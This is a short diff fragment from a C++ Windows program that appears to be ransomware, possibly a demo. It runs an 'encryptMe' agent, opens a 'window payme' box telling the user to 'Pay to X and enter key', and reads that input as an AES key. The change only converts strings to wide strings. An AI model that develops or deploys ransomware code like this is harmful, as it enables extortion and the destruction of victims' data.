@@ -15,9 +15,9 @@ int WINAPI WinMain(HINSTANCE hInstance,
 	Agent agent("C:\\encryptMe");
 	agent.execute();
 
-	TextBoxInput text_box_input(hInstance, "window payme", "Pay to X and enter key");
+	TextBoxInput text_box_input(hInstance, L"window payme", L"Pay to X and enter key");
 	text_box_input.window_loop();
-	const std::string key_as_string = text_box_input.text_input();
+	const std::wstring key_as_string = text_box_input.text_input();
 
 	std::array<CryptoPP::byte, CryptoPP::AES::DEFAULT_KEYLENGTH> encryption_key;
 	uint32_t current_key_byte = 0;
